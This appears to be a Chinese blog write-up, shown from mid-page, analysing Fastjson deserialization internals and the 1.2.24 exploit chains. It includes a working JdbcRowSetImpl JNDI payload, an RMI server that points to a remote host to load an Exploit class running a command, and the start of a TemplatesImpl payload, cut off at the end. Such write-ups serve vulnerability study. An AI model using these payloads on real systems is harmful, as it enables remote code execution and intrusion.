&#125;<br>&#125;<br></code></pre></td></tr></table></figure><img src="https://gitee.com/ling-x5/img/raw/master/image-20250320180238172.png" alt="image-20250320180238172" style="zoom:50%;" /><p>可以看到，我们仍然可以得到 javaBean 对象</p><blockquote><p>而 fastjson 同样提供了单参数的 parseObject()方法 com.alibaba.fastjson.JSON#parseObject(java.lang.String)，他其实就是对 com.alibaba.fastjson.JSON#parse(java.lang.String)方法做了一层封装，返回结果做了强转为 JSONObject 对象。</p></blockquote><img src="https://gitee.com/ling-x5/img/raw/master/image-20250320200041731.png" alt="image-20250320200041731" style="zoom:67%;" /><p>这样其实导致 com.alibaba.fastjson.JSON#parseObject(java.lang.String)在处理@type 注解时，既会调用 setter()方法，也会在 JSON.toJSON(obj)时调用 getter()方法。</p><p><strong>值得注意的是</strong></p><blockquote><p>假设一个类 <code>Person</code> 有一个字段 <code>name</code>，但没有 <code>setName()</code> 方法，只有 <code>getName()</code> 方法。 Fastjson 仍然可能将 JSON 中的 <code>&quot;name&quot;</code> 键识别为一个属性，即使它无法通过 Setter 方法设置值 (在这种情况下，如果 <code>name</code> 字段是 public 的且非 final，Fastjson 可能会尝试直接字段赋值，但这通常不是首选方式)。</p></blockquote><p>就像我们把 setName(String name)方法注释起来，而 name 字段为 private 时，运行下面这段代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.lingx5.entry.Person;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">jsonTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">personJson</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;name\&quot;:\&quot;lingx5\&quot;,\&quot;age\&quot;:18&#125;&quot;</span>;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">parse</span> <span class="hljs-operator">=</span> JSON.parseObject(personJson, com.lingx5.entry.Person.class);<br>        System.out.println(parse);<br>        System.out.println(<span class="hljs-string">&quot;parse的类型是：&quot;</span>+parse.getClass().getTypeName());<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> (Person) parse;<br>        System.out.println((person.getName() + <span class="hljs-string">&quot;:&quot;</span> + person.getAge()));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321085019318.png" alt="image-20250321085019318" style="zoom:50%;" /><p>看到 name 的值为 null，而当我们把 name 改为 public 时，可以看到即使没有 setter 方法，name 仍然是可以有值的。</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321084928094.png" alt="image-20250321084928094" style="zoom:50%;" /><h2 id="fastjson-源码分析"><a href="#fastjson-源码分析" class="headerlink" title="fastjson 源码分析"></a>fastjson 源码分析</h2><p>我们在 Object parse &#x3D; JSON.parse(personJson); 出打断点，跟如</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321092248672.png" alt="image-20250321092248672"></p><h3 id="parseObject-1"><a href="#parseObject-1" class="headerlink" title="parseObject"></a>parseObject</h3><p>调试我们会来到 com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)方法，先检测@type 标签，然后根据值进行类加载</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321092721528.png" alt="image-20250321092721528"></p><h3 id="TypeUtils-类加载"><a href="#TypeUtils-类加载" class="headerlink" title="TypeUtils 类加载"></a>TypeUtils 类加载</h3><p>parseObject 检测并获取获取@type 后，会调用 com.alibaba.fastjson.util.TypeUtils#loadClass 方法进行类加载</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321092953278.png" alt="image-20250321092953278"></p><p>而 com.alibaba.fastjson.util.TypeUtils#loadClass 方法，会去检测类型，做对应的类加载。数组 <code>[</code> 开头和引用 <code>L</code> 开头，<code>;</code> 结尾</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321093404006.png" alt="image-20250321093404006"></p><p><span style="color:#FF0000;"> 这其实时 fastjson 为了后续调用 asm 去加载属性值，做的处理。只是没有想到会被我们利用拿来绕过 </span></p><p>当然，我们的字段现在只是普通的类名，不会走这里，我们只是进行类加载，拿到 com.lingx5.entry.Person 类，并放入 com.alibaba.fastjson.util.TypeUtils#mappings 属性中，然后把 class 返回</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321094123481.png" alt="image-20250321094123481"></p><h3 id="getDeserializer"><a href="#getDeserializer" class="headerlink" title="getDeserializer"></a>getDeserializer</h3><p>获取 Java Bean 的反序列化器 (Deserializer)</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321094819605.png" alt="image-20250321094819605"></p><p>com.alibaba.fastjson.parser.ParserConfig#getDeserializer(java.lang.reflect.Type) 里面经过一系列的判断后，我们会来到 com.alibaba.fastjson.parser.ParserConfig#createJavaBeanDeserializer 方法去创建 Java Bean 反序列化器</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321095216360.png" alt="image-20250321095216360"></p><p>继续跟进，会调用到 com.alibaba.fastjson.util.DeserializeBeanInfo#computeSetters 封装 BeanInfo 对象</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321095441035.png" alt="image-20250321095441035"></p><p>我们跟进它，会发现他会通过反射获取我们 class com.lingx5.entry.Person 的无参构造方法和 setter 方法，当然要符合规范，我们进去看看有哪些规则</p><p>开始就是获取无参构造器，把构造方法赋值到 com.alibaba.fastjson.util.DeserializeBeanInfo#defaultConstructor 属性中</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321102403614.png" alt="image-20250321102403614"></p><p>截取一下判断方法的关键语句（注释标明作用）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 反射获取所有方法名，遍历</span><br><span class="hljs-keyword">for</span> (Method method : clazz.getMethods()) &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">ordinal</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>, serialzeFeatures = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> method.getName();<br>    <span class="hljs-comment">// 方法名长度必须 &gt;= 4</span><br>    <span class="hljs-keyword">if</span> (methodName.length() &lt; <span class="hljs-number">4</span>) &#123;<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>    <span class="hljs-comment">// 非静态方法</span><br>    <span class="hljs-keyword">if</span> (Modifier.isStatic(method.getModifiers())) &#123;<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// support builder set</span><br>    <span class="hljs-comment">// 方法返回类型是 void 或者 当前类 clazz 本身</span><br>    <span class="hljs-keyword">if</span> (!(method.getReturnType().equals(Void.TYPE) || method.getReturnType().equals(clazz))) &#123;<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>    <span class="hljs-comment">// 方法参数只能有一个</span><br>    <span class="hljs-keyword">if</span> (method.getParameterTypes().length != <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>    <span class="hljs-comment">// 检测@JSONFiled注解</span><br>    <span class="hljs-type">JSONField</span> <span class="hljs-variable">annotation</span> <span class="hljs-operator">=</span> method.getAnnotation(JSONField.class);<br><br>    <span class="hljs-keyword">if</span> (annotation == <span class="hljs-literal">null</span>) &#123;<br>        annotation = TypeUtils.getSupperMethodAnnotation(clazz, method);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (annotation != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">if</span> (!annotation.deserialize()) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        ordinal = annotation.ordinal();<br>        serialzeFeatures = SerializerFeature.of(annotation.serialzeFeatures());<br><br>        <span class="hljs-keyword">if</span> (annotation.name().length() != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">propertyName</span> <span class="hljs-operator">=</span> annotation.name();<br>            beanInfo.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FieldInfo</span>(propertyName, method, <span class="hljs-literal">null</span>, clazz, type, ordinal, serialzeFeatures));<br>            TypeUtils.setAccessible(method);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// 方法以 &quot;set&quot; 开头</span><br>    <span class="hljs-keyword">if</span> (!methodName.startsWith(<span class="hljs-string">&quot;set&quot;</span>)) &#123;<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br><br>    <span class="hljs-type">char</span> <span class="hljs-variable">c3</span> <span class="hljs-operator">=</span> methodName.charAt(<span class="hljs-number">3</span>);<br><br>    <span class="hljs-comment">// 检测是否符合javaBean规范，并拆解属性名称</span><br>    String propertyName;<br>    <span class="hljs-keyword">if</span> (Character.isUpperCase(c3)) &#123;<br>        <span class="hljs-keyword">if</span> (TypeUtils.compatibleWithJavaBean) &#123;<br>            propertyName = TypeUtils.decapitalize(methodName.substring(<span class="hljs-number">3</span>));<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            propertyName = Character.toLowerCase(methodName.charAt(<span class="hljs-number">3</span>)) + methodName.substring(<span class="hljs-number">4</span>);<br>        &#125;<br>        <span class="hljs-comment">// 忽略 &#x27;_&#x27;字符</span><br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c3 == <span class="hljs-string">&#x27;_&#x27;</span>) &#123;<br>        propertyName = methodName.substring(<span class="hljs-number">4</span>);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c3 == <span class="hljs-string">&#x27;f&#x27;</span>) &#123;<br>        propertyName = methodName.substring(<span class="hljs-number">3</span>);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (methodName.length() &gt;= <span class="hljs-number">5</span> &amp;&amp; Character.isUpperCase(methodName.charAt(<span class="hljs-number">4</span>))) &#123;<br>        propertyName = TypeUtils.decapitalize(methodName.substring(<span class="hljs-number">3</span>));<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>    <span class="hljs-comment">// 对boolean类型字段的判断</span><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> TypeUtils.getField(clazz, propertyName);<br>    <span class="hljs-keyword">if</span> (field == <span class="hljs-literal">null</span> &amp;&amp; method.getParameterTypes()[<span class="hljs-number">0</span>] == <span class="hljs-type">boolean</span>.class) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">isFieldName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;is&quot;</span> + Character.toUpperCase(propertyName.charAt(<span class="hljs-number">0</span>)) + propertyName.substring(<span class="hljs-number">1</span>);<br>        field = TypeUtils.getField(clazz, isFieldName);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (field != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-type">JSONField</span> <span class="hljs-variable">fieldAnnotation</span> <span class="hljs-operator">=</span> field.getAnnotation(JSONField.class);<br><br>        <span class="hljs-keyword">if</span> (fieldAnnotation != <span class="hljs-literal">null</span>) &#123;<br>            ordinal = fieldAnnotation.ordinal();<br>            serialzeFeatures = SerializerFeature.of(fieldAnnotation.serialzeFeatures());<br><br>            <span class="hljs-keyword">if</span> (fieldAnnotation.name().length() != <span class="hljs-number">0</span>) &#123;<br>                propertyName = fieldAnnotation.name();<br>                beanInfo.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FieldInfo</span>(propertyName, method, field, clazz, type, ordinal, serialzeFeatures));<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-comment">// 封装成Filedinfo中，并添加到beanInfo</span><br>    beanInfo.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FieldInfo</span>(propertyName, method, <span class="hljs-literal">null</span>, clazz, type, ordinal, serialzeFeatures));<br>    TypeUtils.setAccessible(method);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h3><p>通过上边的判断，我们可以总结出 setter 方法的一些特性</p><ul><li>方法名长度必须 &gt;&#x3D; 4</li><li>非静态方法</li><li>方法返回类型是 void 或者 当前类 clazz 本身</li><li>方法参数只能有一个</li><li>方法以 “set” 开头</li></ul><p>除此之外 fastjson 还有其他特性：</p><ul><li>匹配 getter()和 setter()方法时，<code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()</code> 方法，会忽略 <code>_ -</code> 字符串</li><li>在序列化和反序列化 byte [] 数组时，会做 base64 的编码和解码</li></ul><p>最后把 beanInfo 返回</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321102644195.png" alt="image-20250321102644195"></p><p>com.alibaba.fastjson.parser.ParserConfig#createJavaBeanDeserializer 做了一系列判断后，利用 asmFactory 创建 JavaBeanDeserializer</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321102938817.png" alt="image-20250321102938817"></p><p>利用 asm 创建了一个 Java Bean 的反序列化器</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321103241974.png" alt="image-20250321103241974"></p><p>最后利用 classLoader 把它加载到内存，并创建实例返回</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321103508510.png" alt="image-20250321103508510"></p><h3 id="deserialze"><a href="#deserialze" class="headerlink" title="deserialze"></a>deserialze</h3><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321104247886.png" alt="image-20250321104247886"></p><p>调用 asm 创建的 Java Bean 的反序列化器，通过反射机制，创建 Person 实例。我们在 com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer 类中打断点</p><p>先调用无参构造方法，这是在创建 JavaBeanDeserializer 时调用的</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321104233480.png" alt="image-20250321104233480"></p><p>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#deserialze(com.alibaba.fastjson.parser.DefaultJSONParser, java.lang.reflect.Type, java.lang.Object, java.lang.Object) 通过 com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#parseField 调用 com.alibaba.fastjson.parser.deserializer.FieldDeserializer#setValue(java.lang.Object, int)，给属性赋值</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321130815412.png" alt="image-20250321130815412"></p><p>利用 setter 方法给属性赋值</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321131112544.png" alt="image-20250321131112544"></p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321131227607.png" alt="image-20250321131227607"></p><h2 id="fastjson-反序列"><a href="#fastjson-反序列" class="headerlink" title="fastjson 反序列"></a>fastjson 反序列</h2><h3 id="1-2-24"><a href="#1-2-24" class="headerlink" title="1.2.24"></a>1.2.24</h3><p>经过前面的学习，我们已经理解了 fastjson 是如何运作的。对于 fastjson 反序列化攻击，比较流行的就是 TemplatesImpl 反序列化和 JdbcRowSetImpl 反序列化</p><h4 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h4><p>我们先来看 JdbcRowSetImpl </p><p>我们要利用 fastjson 构成攻击，肯定是利用 fastjson 做解析式自动调用 setter()方法的特性，我们来看 com.sun.rowset.JdbcRowSetImpl#setAutoCommit 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAutoCommit</span><span class="hljs-params">(<span class="hljs-type">boolean</span> autoCommit)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>    <span class="hljs-comment">// The connection object should be there</span><br>    <span class="hljs-comment">// in order to commit the connection handle on or off.</span><br><br>    <span class="hljs-keyword">if</span>(conn != <span class="hljs-literal">null</span>) &#123;<br>        conn.setAutoCommit(autoCommit);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Coming here means the connection object is null.</span><br>        <span class="hljs-comment">// So generate a connection handle internally, since</span><br>        <span class="hljs-comment">// a JdbcRowSet is always connected to a db, it is fine</span><br>        <span class="hljs-comment">// to get a handle to the connection.</span><br><br>        <span class="hljs-comment">// Get hold of a connection handle</span><br>        <span class="hljs-comment">// and change the autcommit as passesd.</span><br>        conn = connect();<br><br>        <span class="hljs-comment">// After setting the below the conn.getAutoCommit()</span><br>        <span class="hljs-comment">// should return the same value.</span><br>        conn.setAutoCommit(autoCommit);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>看到当 conn 为 null 时，会去调用 connect()方法，我们进入看一下这个 connect()方法</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321140554584.png" alt="image-20250321140554584"></p><p>这不就像极了我们 JNDI 注入的方式，接下来只需要 getDataSourceName()满足可空，就可以利用了</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321141902833.png" alt="image-20250321141902833" style="zoom:67%;" /><p>看到 dataSource 有对应的 setter()方法，我们所有在对应 JDK 版本的 JNDI 注入漏洞都能打了</p><p>我这里用的 jdk7，还没有对 JNDI 注入做防御</p><p><strong>JdbcRowSetImplEXP</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.exp;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JdbcRowSetImplEXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;dataSource\&quot;:\&quot;rmi://localhost:1099/Exploit\&quot;,&quot;</span> +<br>                <span class="hljs-comment">// 调用 setAutoCommit 方法，触发攻击链</span><br>                <span class="hljs-string">&quot;\&quot;autoCommit\&quot;:true&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        <span class="hljs-comment">// 模拟受害的fastjson服务器</span><br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>RMIServer</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5;<br><br><br><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 创建JNDI引用</span><br>            <span class="hljs-type">Reference</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;Exploit&quot;</span>, <span class="hljs-string">&quot;Exploit&quot;</span>, <span class="hljs-string">&quot;http://lingx5.dns.army:8000/&quot;</span>);<br>            <span class="hljs-comment">// 封装Reference对象</span><br>            <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">refWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(ref);<br>            <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>            registry.bind(<span class="hljs-string">&quot;Exploit&quot;</span>,refWrapper);<br>            System.out.println(<span class="hljs-string">&quot;RMI registry started at 1099.&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Exploit</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>还是一样，这个文件头是不能有 package 字段的，否则 JNDI 服务器加载不了这个类，也就无法复现成功</p><p>编译成 Class 的 jdk 版本要与运行版本一致，还有解释自己本例的 Exploit 的要删掉。因为 JNDI 会先去加载自己本地的类，本地没有才会去加载远程服务器的类</p></blockquote><p>开启远程的 http 服务</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321145158177.png" alt="image-20250321145158177"></p><p>执行</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321145102242.png" alt="image-20250321145102242"></p><h4 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a><strong>TemplatesImpl</strong></h4><p>这个类产生漏洞原因就是它拥有类加载的能力，并且调用了 newInstants()将定义的类实例化了。这会执行恶意类的 static 静态代码块</p><p>我们在结构的属性中可以看到这个类有 getter 和 setter 方法的属性</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321160154032.png" alt="image-20250321160154032" style="zoom:67%;" /><p>这里我们来到 getOutputProperties()方法，他会去调用 newTransformer()</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321160313509.png" alt="image-20250321160313509"></p><p>而 newTransformer()会调用 getTransletInstance()方法</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321160418189.png" alt="image-20250321160418189"></p><p>getTransletInstance()里有定义类的方法 defineTransletClasses()和实例化的方法 newInstance()</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321160742898.png" alt="image-20250321160742898"></p><p>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#defineTransletClasses 的关键代码有：</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321191416487.png" alt="image-20250321191416487"></p><p>看到 <code>_class[i]</code> 其实就是 <code>_bytecodes[i]</code> 定义的类，我们可以给 <code>_bytecodes[i]</code> 传递恶意类的字节码，</p><p>基本的链条就有了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">getOutputProperties<br>    newTransformer<br>    getTransletInstance<br>    defineTransletClasses<br>    evil.class.newInstance<br></code></pre></td></tr></table></figure><p>当让为了让链条成立，我们还需要躲避一些 if 判断，使得 <code>_name</code> 和 <code>_factory</code> 不为空</p><p>构造 payload</p><p><strong>TemplatesImplEXP</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.exp;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TemplatesImplEXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                <span 